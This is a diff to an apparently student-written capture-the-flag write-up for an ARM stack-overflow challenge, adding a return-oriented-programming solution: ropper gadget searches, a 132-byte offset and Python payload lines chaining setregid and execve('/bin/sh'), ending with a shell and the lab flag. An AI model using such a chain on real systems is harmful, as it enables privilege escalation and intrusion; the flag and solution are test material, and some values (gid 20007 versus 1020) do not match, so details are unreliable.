@@ -19,6 +19,8 @@ from pwn import *
   - [6-stack-ovfl-use-envp-arm](#6-stack-ovfl-use-envp-arm)
   - [7-stack-ovfl-no-envp-arm](#7-stack-ovfl-no-envp-arm)
   - [8-rop0-arm](#8-rop0-arm)
+    - [1. setregid(1020, 1020)](#1-setregid1020-1020)
+    - [2. execve("/bin/sh", 0, 0)](#2-execvebinsh-0-0)
   - [(bonus) 9-rop1-arm](#bonus-9-rop1-arm)
 
 ## 1-shellcode-arm
@@ -575,9 +577,8 @@ Thus, what we need to do are
 - [ ] detect buffer address
 - [ ] get the addresses of syscalls
 - [ ] send addresses and arguments by buffer overflow
-  - [ ] the first package contains `setregid`, `rop2`, `1020`, and `1020`. `rop2` is to pop 2 elements in the stack
-  - [ ] the second package contains `execve`, `"/bin/sh"`, `rop3`, `0`, `0`. `rop3` is to pop 3 elements in the stack
-  - [ ] the last package contains `exit`
+  - [ ] the first package contains `setregid`, `1020`, and `1020`.
+  - [ ] the second package contains `execve`, `"/bin/sh"`, `0`, `0`.
 
 First, we check the buffer address. It is `0xffcd5118` from gdb.
 
@@ -588,22 +589,16 @@ read@plt (
    $r2 = 0x000100,
    $r3 = 0xffcd5118 → 0x00000000
 )
+read@plt (
+   $r0 = 0x000000,
+   $r1 = 0xffd828a8 → 0x00000000,
+   $r2 = 0x000100,
+   $r3 = 0xffd828a8 → 0x00000000
+)
 ```
 
 The saved address from `input_func` is `0xffcd5190`.
-
-```gdb
-gef➤  info frame
-Stack level 0, frame at 0xffcd5198:
- pc = 0x105b0 in input_func; saved pc = 0x10648
- called by frame at 0xffcd51b8
- Arglist at 0xffcd519c, args:
- Locals at 0xffcd519c, Previous frame's sp is 0xffcd5198
- Saved registers:
-  r11 at 0xffcd5190, lr at 0xffcd5194
-```
-
-`0xffcd5190 - 0xffcd5118 = 120`, so first pad buffer with 120 bytes.
+`0xffcd5190 - 0xffcd5118 = 120`, so first pad buffer with 120 bytes. However, to make the buffer overflow happen, you need 132 bytes. That's what we can know through debugging.
 
 - [x] detect buffer address
 
@@ -621,23 +616,116 @@ You can learn the addresses of syscalls by reading `objdump -d ./8-rop0-arm`
    103fc:	e5bcfc2c 	ldr	pc, [ip, #3116]!	; 0xc2c
 ```
 
-You can overflow this program and get the address of syscalls.
+- [x] get the addresses of syscalls
 
-```gdb
-gef➤  print execve
-$2 = {<text variable, no debug info>} 0xf77ffa50 <execve>
-gef➤  print setregid
-$3 = {int (gid_t, gid_t)} 0xf7820710 <__setregid>
-gef➤  print exit
-$4 = {void (int)} 0xf77b0774 <__GI_exit>
+Use `ropper` to find rop gadgets.
+
+Start `ropper` and load the binary file.
+
+```bash
+TXK220008@ctf-vm2:~/unit2/8-rop0-arm $ ropper
+(ropper)> file 8-rop0-arm
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] File loaded.
 ```
 
-These instructions look useful.
+Look for useful instructions with `pop`.
+
+```ropper
+(8-rop0-arm/ELF/ARM)> search pop
+[INFO] Searching for gadgets: pop
+
+[INFO] File: 8-rop0-arm
+0x00010514: pop {fp, pc};
+0x00010388: pop {r3, pc};
+0x000104f0: pop {r4, pc};
+0x00010650: pop {r4, r5, r6, r7, r8, sb, sl, pc};
+0x00010650: pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r0, lsl #18; strdeq r0, r1, [r1], -r4; bx lr;
+0x000104e0: popne {r4, pc}; bl #0x46c; mov r3, #1; strb r3, [r4]; pop {r4, pc};
+```
+
+Likewise, look for useful instructions with `mov`.
+
+From them, these instructions can be used to set `r0`, `r1`, and `r2` for arguments and `r3` for calling a function.
 
 ```armasm
-0x000105a0: ldr r0, [pc, #0x24]; bl #0x3a0; mov r0, r0; sub sp, fp, #4; pop {fp, pc};
-0x00010634: ldr r3, [r5], #4; mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
+0x00010388: pop {r3, pc};
 0x00010650: pop {r4, r5, r6, r7, r8, sb, sl, pc};
+0x00010638: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
+```
+
+We cannot use a string `"/bin/sh"` to call it, so use the symbolic link. `0x106EE` is `1` and us eit.
+
+Suppose these are constants that will be used in my solution.
+
+```python
+# 0x00010388: pop {r3, pc};
+rop3 = 0x00010388
+# 0x00010638: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
+mov = 0x00010638
+# 0x00010650: pop {r4, r5, r6, r7, r8, sb, sl, pc};
+rop4 = 0x00010650
+# setregid
+setregid = 0x000103F4
+gid = 20007
+# execve
+execve = 0x000103DC
+binsh = 0x106EE
+offset = 132
+JUNK = 0x4B4E554A
+```
+
+Then, do ROP. To set function in `r3`, first call `rop3`.
+
+### 1. setregid(1020, 1020)
+
+```python
+payload += struct.pack("I", rop3)
+payload += struct.pack("I", setregid)  # r3
+```
+
+And, then set the other arguments and call `setregid`.
+
+```python
+payload += struct.pack("I", rop4)
+payload += struct.pack("I", JUNK)  # r4
+payload += struct.pack("I", JUNK)  # r5
+payload += struct.pack("I", JUNK)  # r6
+payload += struct.pack("I", gid)  # r7 -> r0
+payload += struct.pack("I", gid)  # r8 -> r1
+payload += struct.pack("I", JUNK)  # sb -> r2
+payload += struct.pack("I", JUNK)  # sl
+payload += struct.pack("I", mov)  # pc
+```
+
+### 2. execve("/bin/sh", 0, 0)
+
+First, we are in `rop4`. Set `r4` to `pc` first. Set `rop3` at `pc`, and set `execve` in `r3` and `mov` in `pc` in `rop3`.
+
+```python
+payload += struct.pack("I", JUNK)  # r4
+payload += struct.pack("I", JUNK)  # r5
+payload += struct.pack("I", JUNK)  # r6
+payload += struct.pack("I", binsh)  # r7 -> r0
+payload += struct.pack("I", 0)  # r8 -> r1
+payload += struct.pack("I", 0)  # sb -> r2
+payload += struct.pack("I", JUNK)  # sl
+payload += struct.pack("I", rop3)  # pc
+payload += struct.pack("I", execve)  # r3
+payload += struct.pack("I", mov)  # pc
+```
+
+You've got the flag.
+
+```bash
+TXK220008@ctf-vm2:~/unit2/8-rop0-arm $ ./solve8.py
+[+] Starting local process './8-rop0-arm': pid 333879
+[*] Switching to interactive mode
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x88\x03!
+$ cat flag
+cs6332{pop_pop_pop_bx_pop_corn}
 ```
 
 - [x] get the addresses of syscalls
